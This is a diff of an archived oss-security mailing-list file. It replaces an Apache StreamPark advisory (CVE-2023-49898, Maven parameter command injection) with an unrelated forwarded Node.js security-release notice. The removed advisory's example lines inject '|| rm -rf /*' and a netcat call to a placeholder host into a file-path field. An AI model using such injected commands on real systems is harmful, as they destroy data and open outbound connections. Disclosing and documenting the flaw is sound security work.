@@ -1,36 +1,33 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/15/5
-Message-ID: <194cea17-709a-a972-99b4-c68032c696d3@apache.org>
-Date: Fri, 15 Dec 2023 11:00:59 +0000
-From: Huajie Wang <benjobs@...che.org>
-To: oss-security@...ts.openwall.com
-Subject: CVE-2023-49898: Apache StreamPark (incubating): Authenticated system users could trigger remote command execution 
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/08/10/2
+Message-Id: <ab9626a5-56c5-48e7-8422-323fb09cb276n@googlegroups.com>
+Date: Wed, 9 Aug 2023 11:15:06 -0700 (PDT)
+From: Rafael Silva <rafael.silva@...rform.com>
+To: <oss-security@...ts.openwall.com>
+Subject: Fwd: Node.js security updates for all active release lines, August 2023
 Content-Type: text/plain; charset=utf-8
 
-Severity: low
 
-Affected versions:
 
-- Apache StreamPark (incubating) 2.0.0 before 2.1.2
+---------- Forwarded message ---------
+From: Rafael Silva <rafael.silva@...rform.com>
+Date: Wednesday, August 9, 2023 at 3:14:35 PM UTC-3
+Subject: Re: Node.js security updates for all active release lines, August 
+2023
+To: nodejs-sec <nodejs-sec@...glegroups.com>
 
-Description:
 
-In streampark, there is a project module that integrates Maven's compilation capability. However, there is no check on the compilation parameters of Maven. allowing attackers to insert commands for remote command execution, The prerequisite for a successful attack is that the user needs to log in to the streampark system and have system-level permissions. Generally, only users of that system have the authorization to log in, and users would not manually input a dangerous operation command. Therefore, the risk level of this vulnerability is very low.
+The planned security releases are now available. You can read more about 
+the details in 
+https://nodejs.org/en/blog/vulnerability/august-2023-security-releases/.
 
-Mitigation:
+On Monday, July 31, 2023 at 11:48:26 AM UTC-3 Rafael Silva wrote:
 
-all users should upgrade to 2.1.2
+The Node.js project will release new versions of all supported release 
+lines on or shortly after Tuesday, August 8th, 2023.
 
-Example:
+For more information see: 
+https://nodejs.org/en/blog/vulnerability/august-2023-security-releases/
 
-##You can customize the splicing method according to the compilation situation of the project, mvn compilation results use &&, compilation failure use "||" or "&&":
 
-/usr/share/java/maven-3/conf/settings.xml || rm -rf /*
-
-/usr/share/java/maven-3/conf/settings.xml && nohup nc x.x.x.x 8899 &
-
-References:
-
-https://streampark.incubator.apache.org
-https://www.cve.org/CVERecord?id=CVE-2023-49898
-
+Content of type "text/html" skipped
